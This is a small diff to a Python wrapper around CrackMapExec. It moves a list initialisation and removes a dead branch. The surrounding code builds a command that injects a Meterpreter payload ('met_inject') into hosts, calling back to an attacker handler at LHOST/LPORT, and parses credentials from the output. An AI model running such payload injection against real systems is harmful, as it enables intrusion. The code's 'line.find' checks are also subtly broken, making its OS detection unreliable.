@@ -12,11 +12,11 @@ def report(output):
     for line in output.split("\n"):
         ip = re.findall(r"[0-9]+(?:\.[0-9]+){3}", line)
         ip_port = re.findall(r"[0-9]+(?:\.[0-9]+){3}(?:\:[0-9]+)", line)
-        operating_system = []
         credential_passw = ""
         port = 0
 
         if ip:
+            operating_system = []
             if line.find("Unix"):
                 operating_system.append("Unix")
             elif line.find("Windows"):
@@ -100,12 +100,6 @@ def main():
     if lport and lhost:
 
         command += ["--local-auth -M met_inject -o", "LHOST=", lhost, "LPORT=", lport]
-
-    elif lport and lhost:
-        print(
-            "IP hosting the handler (LHOST) or" "Handler port (LPORT) not provided",
-            file=sys.stderr,
-        )
 
     cme_process = subprocess.run(command, stdout=subprocess.PIPE, shell=False)
     output = cme_process.stdout.decode("utf-8")
